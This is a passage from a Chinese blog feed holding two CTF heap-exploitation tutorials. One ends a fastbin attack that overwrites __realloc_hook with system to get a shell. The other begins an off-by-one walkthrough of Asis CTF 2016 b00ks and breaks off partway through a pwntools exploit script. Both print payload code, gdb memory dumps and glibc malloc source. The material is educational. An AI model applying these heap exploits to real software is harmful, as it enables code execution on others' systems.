0x0000000000000000</span><br><span class="line">0x559717162280:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162290:	0x3434343434343434	0x0000000000000000</span><br><span class="line">0x5597171622a0:	0x0000000000000200	0x0000000000000100</span><br><span class="line">0x5597171622b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622d0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622e0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622f0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162300:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162310:	0x4343434343434343	0x4343434343434343</span><br></pre></td></tr></table></figure><p>既然知道他会覆盖那部分，我就提前查看这部分内容，进行覆盖就行了，然后将gdb.attach放到合并堆块那会，查看具体内容，也就是在这</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p)</span><br><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br></pre></td></tr></table></figure><p>查看具体内容，然后进行覆盖</p><ol><li><p>我上面所说的这是土方法，我测试出来的。</p></li><li><p>其实这些都可以预估的，前面DEL(1) DEL(3),所以会空闲两个结构体，这是fastbin部分的空闲堆块，所以结构体会在原来的chunk上建立，至于申请的0xa8不属于fastbin里，所以他会从大堆块里取，取出能存放0xa8大小的chunk，第二次put的话先申请一个结构体0x40大小的结构体存放红黑树结构，然后在申请0x78大小的chunk，都是从大堆块里取，因为此时fastbin里没有空闲堆块了，第一块用于PUT(“a”, 0x88, p8(0)<em>0x88),第二块用于PUT(“6”</em>0x8, 0xa8, payload)</p></li><li><p>PUT(“d”*0x8, 0x60, payload)这里先申请一个堆块，同时保护现场，因为原来是fastbin中的一个chunk指向了realloc_hook，现在申请过后，在申请一个堆块便是realloc_hook的地址了</p></li></ol><p>注意：还记得开头申请两个3吗，申请第二个3的时候会先删除前一个chunk，那个就是fastbin里0x70大小的chunk，所以我们覆盖的就是这个chunk的fd</p><h4 id="覆写realloc-hook"><a href="#覆写realloc-hook" class="headerlink" title="覆写realloc_hook"></a>覆写realloc_hook</h4><p>还记得我前面realloc_hook地址怎么写payload的吗<br>看<br>realloc_hook_addr-0x8-0x3-0x8<br>为什么要这么写呢？<br>先看看realloc_hook附近</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure><p>你记得malloc_chunk是怎么样的吗？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们要申请个chunk的话，应当如何，不伪造chunk可不可以，我尝试过，失败了，<br>我报了这个错<br><strong>malloc(): memory corruption (fast)</strong><br>经师傅提点，去查看malloc源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                        victim)) != victim);</span><br><span class="line">    <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">        <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">        <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">        errout:</span><br><span class="line">            malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他会检测大小是否正确，所以不伪造chunk的size部分过不了关的<br>在回到这里</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样是个chunk的话，pre_size是0x00007f14d2335c90，size是0，这样肯定没法搞，所以我们要利用一点错位，让size成功变成fastbin里的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10-0x3</span><br><span class="line">0x7f14d267071d:	0x14d2335c90000000	0x000000000000007f</span><br><span class="line">0x7f14d267072d:	0x14d2335c30000000	0x000000000000007f</span><br><span class="line">0x7f14d267073d:	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样不就成了，size为0x7f，然后我们现在大小对了，位置错位了，所以最后我们要补个’a’*0x3来填充我们的错位部分，然后在realloc部分填上我们的system地址，最后在调用一次getshell</p><p>这里的错位需要自己调试，不一定是跟我一样的错位，在fastbin attack部分也将会学习到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc_base+system_off</span><br><span class="line">print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">payload = <span class="string">"/bin/sh"</span></span><br><span class="line">payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">GET(payload)</span><br></pre></td></tr></table></figure><p>到了结尾了，这里有个点说明下，我们malloc(0x7f)跟伪造chunk的size是完全不一样的，我们malloc过后还要经过计算才得到size，你看普通malloc(0x7f)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x557c81b53130:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x557c81b53140:	0x0000557c81b53070	0x000000000000007f</span><br><span class="line">0x557c81b53150:	0x0000557c81b53180	0x0000557c81b53010</span><br><span class="line">0x557c81b53160:	0x0000557c81b53210	0x0000000000000000</span><br><span class="line">0x557c81b53170:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x557c81b53180:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b53190:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531a0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531b0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531f0:	0x4242424242424242	0x0042424242424242</span><br></pre></td></tr></table></figure><p>他获得的是0x91大小的chunk，具体size计算可以自己看源码，我只是点出这个点而已</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>这道题知识点较多，利用较复杂，利用堆块重叠泄露，在用fastbin attack</li><li>错位伪造chunk知识点，补上了，第一次遇到</li><li>这道题需要对堆的分配机制较为熟练才比较好做，像我调试了很久，最终才的出来的结论</li><li>遇到错误要学会去查看源码，好几个师傅都叫我看源码，最后才懂的</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY5NjYuaHRt" title="https://bbs.pediy.com/thread-246966.htm">看雪的师傅的文章<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvb2ZmX2J5X29uZS16aC8=" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/">ctf-wiki原理介绍<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/83154af0/">https://noone-hub.github.io/posts/83154af0/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程1</title>
    <url>/posts/1a1c1b4a/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h1><p>本文首发于先知社区</p><p>因为自己学堆的时候，找不到一个系统的教程，我将会按照ctf-wiki的目录一步步学下去，尽量做到每天有更新，方便跟我一样刚入门堆的人学习，第一篇教程研究了4天吧，途中没人指导。。很尴尬，自己一个很容易的点研究了很久才懂，把踩过的坑也总结下，方便后人不再踩坑</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNTc0OQ==" title="https://xz.aliyun.com/t/5749">具体搭建方法点我<i class="fa fa-external-link"></i></span></p><h2 id="off-by-one原理（引用ctf-wiki"><a href="#off-by-one原理（引用ctf-wiki" class="headerlink" title="off by one原理（引用ctf-wiki)"></a>off by one原理（引用ctf-wiki)</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><p>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。<br>字符串操作不合适<br>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h2 id="off-by-one-利用思路（引用ctf-wiki"><a href="#off-by-one-利用思路（引用ctf-wiki" class="headerlink" title="off-by-one 利用思路（引用ctf-wiki)"></a>off-by-one 利用思路（引用ctf-wiki)</h2><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</p><h2 id="off-by-one-自己理解"><a href="#off-by-one-自己理解" class="headerlink" title="off by one 自己理解"></a>off by one 自己理解</h2><p>其实就是程序员不小心，我们自己刚写代码的时候也是那样，经常会搞错，比如如下c代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    str[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码相信类似的，我们都写过，我们数组最高是<br>数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one，可这个开始我也没懂这个的强大，直到做了一道题目</p><h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>ctf-wiki上用了两种方法解这道题，我也就照着他的exp，一步步调试，没注释就慢慢理解，搞定了，他有纯利用off-by-one的，也有同时利用unlink跟off-by-one的，下面对这两种方法进行解释</p><p>先指出ida解析错误部分</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *(off_202010 + v2) = v3;</span><br><span class="line">    *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *v3 = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个v3加6是错误的偏移，应该是v3+3，具体看汇编代码就可以了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text:<span class="number">0000000000001122</span> ; <span class="number">48</span>:                   *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: Create+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp+var_20]</span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx</span><br><span class="line">.text:<span class="number">000000000000112</span>E ; <span class="number">49</span>:                   *(off_202010 + v2) = v3;</span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, off_202010</span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp+var_1C]</span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx</span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax</span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax</span><br><span class="line">.text:<span class="number">000000000000114</span>C ; <span class="number">50</span>:                   *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx</span><br><span class="line">.text:<span class="number">0000000000001158</span> ; <span class="number">51</span>:                   *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp+ptr]</span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx</span><br><span class="line">.text:<span class="number">0000000000001164</span> ; <span class="number">52</span>:                   *v3 = ++unk_202024;</span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]</span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]</span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span></span><br></pre></td></tr></table></figure><p>看每段的mov语句，</p><ul><li>第一段是mov [rax+18h],edx对应v3+6?</li><li>第二段不看，加了变量</li><li>第三段是mov [rax+10h],rdx对应v3+2？</li></ul><h4 id="off-by-one-攻击过程"><a href="#off-by-one-攻击过程" class="headerlink" title="off-by-one 攻击过程"></a>off-by-one 攻击过程</h4><p>出现这个漏洞的函数在这</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; <span class="comment">//危险部分</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他由于没考虑好边界条件，多写了一个0到末尾<br>书本结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>我先说明下攻击过程，下面的讲解会围绕这个攻击过程来</p><ol><li>填充满author</li><li>创建堆块1，覆盖author结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</li><li>创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</li><li>泄露堆块1地址，记为first_heap</li><li><strong>(关键点来了)</strong> 这时候的攻击思路是利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</li><li>后面就简单了，任意读取获得libc地址</li><li>任意写将__free_hook函数的地址改写成one_gadget地址</li></ol><p>tips:__free_hook若没有则不调用，若有将先于free函数调用</p><h5 id="先贴上exp，没有代码，没有调试就没有灵魂"><a href="#先贴上exp，没有代码，没有调试就没有灵魂" class="headerlink" title="先贴上exp，没有代码，没有调试就没有灵魂"></a>先贴上exp，没有代码，没有调试就没有灵魂</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">48</span>, <span class="string">'1a'</span>, <span class="number">240</span>, <span class="string">'1b'</span>) <span class="comment">#1</span></span><br><span class="line">    create(<span class="number">0x21000</span>, <span class="string">'2a'</span>, <span class="number">0x21000</span>, <span class="string">'2b'</span>)<span class="comment">#2</span></span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    first_heap = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span 